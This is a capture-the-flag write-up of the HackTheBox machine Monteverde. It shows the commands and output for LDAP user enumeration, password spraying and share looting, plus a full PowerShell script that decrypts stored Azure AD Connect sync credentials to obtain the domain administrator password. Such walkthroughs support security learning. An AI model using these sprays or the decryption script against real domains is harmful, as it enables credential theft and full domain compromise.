---
layout: post
title: "HackTheBox — Monteverde"
date: 2026-08-29
difficulty: Medium
os: Windows
---

# HackTheBox — Monteverde

| Field          | Detail                      |
|----------------|-----------------------------|
| **OS**         | Windows Server 2019         |
| **Difficulty** | Medium                      |
| **Domain**     | MEGABANK.LOCAL              |
| **IP**         | 10.129.228.111              |

---

## Reconnaissance

### Port Scan

```bash
nmap -sCV -p- -vv --disable-arp-ping -Pn 10.129.228.111 -oN fullport.nmap
```

```
PORT      STATE SERVICE       REASON  VERSION
53/tcp    open  domain        syn-ack Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2026-08-29 18:58:34Z)
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack
464/tcp   open  kpasswd5?     syn-ack
593/tcp   open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack
3268/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack
5985/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack .NET Message Framing
49667/tcp open  msrpc         syn-ack Microsoft Windows RPC
49673/tcp open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         syn-ack Microsoft Windows RPC
49676/tcp open  msrpc         syn-ack Microsoft Windows RPC
49696/tcp open  msrpc         syn-ack Microsoft Windows RPC
49750/tcp open  msrpc         syn-ack Microsoft Windows RPC
```

The presence of **Kerberos (88)**, **DNS (53)**, **LDAP (389)** and **SMB (445)** confirms a **Domain Controller**. The domain name is `MEGABANK.LOCAL`.

Add entries to `/etc/hosts`:

```bash
sudo nxc smb 10.129.228.111 --generate-hosts-file /etc/hosts
# 10.129.228.111   MONTEVERDE.MEGABANK.LOCAL MEGABANK.LOCAL MONTEVERDE
```

---

## SMB Enumeration

### Anonymous Access

```bash
nxc smb MONTEVERDE -u '' -p '' --shares
```

Anonymous authentication succeeds, but share access is denied:

```
SMB         10.129.228.111  445    MONTEVERDE       [*] Windows 10 / Server 2019 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.228.111  445    MONTEVERDE       [+] MEGABANK.LOCAL\: 
SMB         10.129.228.111  445    MONTEVERDE       [-] Error enumerating shares: STATUS_ACCESS_DENIED
```

### Guest Access

```bash
nxc smb MONTEVERDE -u 'guest' -p '' --shares
```

The guest account is disabled:

```
SMB         10.129.228.111  445    MONTEVERDE       [*] Windows 10 / Server 2019 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\guest: STATUS_ACCOUNT_DISABLED
```

---

## LDAP Enumeration

### Anonymous Bind

```bash
nxc ldap MONTEVERDE -u '' -p ''
```

```
LDAP        10.129.228.111  389    MONTEVERDE       [*] Windows 10 / Server 2019 Build 17763 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:None) (channel binding:No TLS cert)
LDAP        10.129.228.111  389    MONTEVERDE       [+] MEGABANK.LOCAL\:
```

Anonymous LDAP binding is allowed, enough to build a user list.

### Extracting Usernames

```bash
nxc ldap MONTEVERDE -u '' -p '' --users | awk 'NR>6{print $5}' >> users.txt
```

```
mhope
SABatchJobs
svc-ata
svc-bexec
svc-netapp
dgalanos
roleary
smorgan
```

### Username = Password Spray

```bash
nxc ldap MONTEVERDE -u users.txt -p users.txt --no-brute --continue-on-success
```

```
LDAP        10.129.228.111  389    MONTEVERDE       [*] Windows 10 / Server 2019 Build 17763 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:None) (channel binding:No TLS cert)
LDAP        10.129.228.111  389    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:mhope
LDAP        10.129.228.111  389    MONTEVERDE       [+] MEGABANK.LOCAL\SABatchJobs:SABatchJobs
LDAP        10.129.228.111  389    MONTEVERDE       [-] MEGABANK.LOCAL\svc-ata:svc-ata
LDAP        10.129.228.111  389    MONTEVERDE       [-] MEGABANK.LOCAL\svc-bexec:svc-bexec
LDAP        10.129.228.111  389    MONTEVERDE       [-] MEGABANK.LOCAL\svc-netapp:svc-netapp
LDAP        10.129.228.111  389    MONTEVERDE       [-] MEGABANK.LOCAL\dgalanos:dgalanos
LDAP        10.129.228.111  389    MONTEVERDE       [-] MEGABANK.LOCAL\roleary:roleary
LDAP        10.129.228.111  389    MONTEVERDE       [-] MEGABANK.LOCAL\smorgan:smorgan
```

**Credentials:** `SABatchJobs : SABatchJobs`

---

## BloodHound Enumeration

```bash
bloodhound-python -ns 10.129.228.111 -d MEGABANK.LOCAL -u 'SABatchJobs' -p 'SABatchJobs' -c all --zip
```

No direct privilege escalation path is found for `SABatchJobs`, so the next step is to enumerate SMB shares with this account instead.

---

## SMB Share Enumeration — SABatchJobs

```bash
nxc smb MONTEVERDE -u 'SABatchJobs' -p 'SABatchJobs' --shares
```

```
SMB         10.129.228.111  445    MONTEVERDE       [*] Windows 10 / Server 2019 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.228.111  445    MONTEVERDE       [+] MEGABANK.LOCAL\SABatchJobs:SABatchJobs
SMB         10.129.228.111  445    MONTEVERDE       [*] Enumerated shares
SMB         10.129.228.111  445    MONTEVERDE       Share           Permissions     Remark
SMB         10.129.228.111  445    MONTEVERDE       -----           -----------     ------
SMB         10.129.228.111  445    MONTEVERDE       ADMIN$                          Remote Admin
SMB         10.129.228.111  445    MONTEVERDE       azure_uploads   READ
SMB         10.129.228.111  445    MONTEVERDE       C$                              Default share
SMB         10.129.228.111  445    MONTEVERDE       E$                              Default share
SMB         10.129.228.111  445    MONTEVERDE       IPC$            READ            Remote IPC
SMB         10.129.228.111  445    MONTEVERDE       NETLOGON        READ            Logon server share
SMB         10.129.228.111  445    MONTEVERDE       SYSVOL          READ            Logon server share
SMB         10.129.228.111  445    MONTEVERDE       users$          READ
```

### Exploring users$ Share

```bash
impacket-smbclient MONTEVERDE.LOCAL/SABatchJobs:SABatchJobs@10.129.228.111
> use users$
> tree
```

```
/mhope/azure.xml
```

```bash
# mget azure.xml
```

### Inspecting azure.xml

The file contains a cleartext password:

```xml
<S N="Password">4n0therD4y@n0th3r$</S>
```

---

## Password Spray — mhope

```bash
nxc smb MONTEVERDE -u users.txt -p '4n0therD4y@n0th3r$' --continue-on-success
```

```
SMB         10.129.228.111  445    MONTEVERDE       [*] Windows 10 / Server 2019 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.228.111  445    MONTEVERDE       [+] MEGABANK.LOCAL\mhope:4n0therD4y@n0th3r$
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\SABatchJobs:4n0therD4y@n0th3r$ STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\svc-ata:4n0therD4y@n0th3r$ STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\svc-bexec:4n0therD4y@n0th3r$ STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\svc-netapp:4n0therD4y@n0th3r$ STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\dgalanos:4n0therD4y@n0th3r$ STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\roleary:4n0therD4y@n0th3r$ STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\smorgan:4n0therD4y@n0th3r$ STATUS_LOGON_FAILURE
```

**Credentials:** `mhope : 4n0therD4y@n0th3r$`

---

## WinRM Access — mhope

BloodHound shows `mhope` belongs to the **Remote Management Users** group.

```bash
nxc winrm MONTEVERDE -u mhope -p '4n0therD4y@n0th3r$'
```

```
WINRM       10.129.228.111  5985   MONTEVERDE       [*] Windows 10 / Server 2019 Build 17763 (name:MONTEVERDE) (domain:MEGABANK.LOCAL)
WINRM       10.129.228.111  5985   MONTEVERDE       [+] MEGABANK.LOCAL\mhope:4n0therD4y@n0th3r$ (Pwn3d!)
```

```bash
evil-winrm -i MONTEVERDE -u mhope -p '4n0therD4y@n0th3r$'
```

### User Flag

```
*Evil-WinRM* PS C:\Users\mhope\Desktop> dir

    Directory: C:\Users\mhope\Desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        8/29/2026  11:52 AM             34 user.txt
```

---

## Privilege Escalation — Azure AD Connect

### Group Membership

```
*Evil-WinRM* PS C:\> whoami /groups
```

```
Group Name                                  Type             SID                                          Attributes
=========================================== ================ ============================================ ==================================================
Everyone                                    Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                  Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
MEGABANK\Azure Admins                       Group            S-1-5-21-391775091-850290835-3566037492-2601 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                   Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448
```

`Azure Admins` membership is the interesting lead. Checking installed software on the box reveals **Microsoft Azure AD Connect**, **Azure AD Sync** and **Microsoft SQL Server**, a classic on-prem Azure AD Connect sync server, which stores the credentials it uses to write back to the domain inside its local database.

### ADSync Database — Keying Material

```bash
sqlcmd -S MONTEVERDE -Q "use ADsync; select instance_id,keyset_id,entropy from mms_server_configuration"
```

```
instance_id                          keyset_id   entropy
------------------------------------ ----------- ------------------------------------
1852B527-DD4F-4ECF-B541-EFCCBFF29E31           1 194EC2FC-F186-46CF-B44D-071EB61F49CD
```

### Extracting the Sync Account Credentials

Using the decryption approach documented by [@_xpn_](https://blog.xpnsec.com/azuread-connect-for-redteam/), which abuses the `mcrypt.dll` key manager bundled with Azure AD Connect to decrypt the stored connector credentials:

```powershell
Function 0xBerk{

    Write-Host "AD Connect Sync Credential Extract POC (@_xpn_)`n"
    $key_id = 1
    $instance_id = [GUID]"1852B527-DD4F-4ECF-B541-EFCCBFF29E31"
    $entropy = [GUID]"194EC2FC-F186-46CF-B44D-071EB61F49CD"
    $client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Server=MONTEVERDE;Database=ADSync;Trusted_Connection=true"
    $client.Open()
    $cmd = $client.CreateCommand()
    $cmd.CommandText = "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'"
    $reader = $cmd.ExecuteReader()
    $reader.Read() | Out-Null
    $config = $reader.GetString(0)
    $crypted = $reader.GetString(1)
    $reader.Close()
    add-type -path 'C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll'
    $km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager
    $km.LoadKeySet($entropy, $instance_id, $key_id)
    $key = $null
    $km.GetActiveCredentialKey([ref]$key)
    $key2 = $null
    $km.GetKey(1, [ref]$key2)
    $decrypted = $null
    $key2.DecryptBase64ToString($crypted, [ref]$decrypted)
    $domain = select-xml -Content $config -XPath "//parameter[@name='forest-login-domain']" | select @{Name = 'Domain'; Expression = {$_.node.InnerXML}}
    $username = select-xml -Content $config -XPath "//parameter[@name='forest-login-user']" | select @{Name = 'Username'; Expression = {$_.node.InnerXML}}
    $password = select-xml -Content $decrypted -XPath "//attribute" | select @{Name = 'Password'; Expression = {$_.node.InnerXML}}
    Write-Host ("Domain: " + $domain.Domain)
    Write-Host ("Username: " + $username.Username)
    Write-Host ("Password: " + $password.Password)
}
```

Upload and execute the script:

```
upload poc.ps1
```

```
*Evil-WinRM* PS C:\Users\mhope\Documents> poc.ps1
*Evil-WinRM* PS C:\Users\mhope\Documents> 0xBerk
AD Connect Sync Credential Extract POC (@_xpn_)

Domain: MEGABANK.LOCAL
Username: administrator
Password: d0m@in4dminyeah!
```

**Credentials:** `administrator : d0m@in4dminyeah!`

---

## Root Flag

```bash
evil-winrm -i MONTEVERDE -u administrator -p 'd0m@in4dminyeah!'
```

```
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir

    Directory: C:\Users\Administrator\Desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        8/29/2026  11:52 AM             34 root.txt
```

---

## Attack Chain

```
anonymous LDAP bind ──► username enumeration
                              │
                    username = password spray
                              │
                       SABatchJobs (LDAP/SMB)
                              │
                        users$ share
                              │
                    mhope/azure.xml (cleartext pwd)
                              │
                     password spray ──► mhope
                              │
                     Remote Management Users
                              │
                       WinRM access
                              │
                      user.txt ✓
                              │
                       Azure Admins group
                              │
              Azure AD Connect / ADSync DB installed
                              │
            sqlcmd ──► instance_id, keyset_id, entropy
                              │
           mcrypt.dll KeyManager decryption (xpn POC)
                              │
                 administrator cleartext password
                              │
                      WinRM → root.txt ✓
```

---

## Tools Used

| Tool                    | Purpose                                        |
|-------------------------|-------------------------------------------------|
| nmap                    | Port scanning                                  |
| netexec (nxc)           | SMB/LDAP/WinRM enumeration & credential spray  |
| impacket-smbclient      | SMB share navigation                           |
| bloodhound-python       | BloodHound data collection                     |
| BloodHound              | AD attack path / group membership analysis     |
| sqlcmd                  | Querying the ADSync SQL database                |
| PowerShell + mcrypt.dll | Decrypting Azure AD Connect sync credentials    |
| evil-winrm              | Remote shell via WinRM                         |

---

## Key Takeaways

- **Anonymous LDAP binds** are enough to dump a full domain user list — always try `nxc ldap -u '' -p ''` before anything else.
- **Username = password spraying** is cheap and frequently effective against service accounts created without a strong onboarding policy.
- **Leftover config/state files on shares** (like `azure.xml` from an Azure AD Sync export) routinely contain cleartext credentials.
- **Azure AD Connect servers are high-value targets**: any account able to read the `ADSync` database (or reach the box with local access) can decrypt the sync account's credentials, which are often highly privileged in the on-prem domain.
- **Group membership matters more than the initial account** - enumerating `mhope`'s groups (Azure Admins) was what revealed the real path to Domain Admin.

---
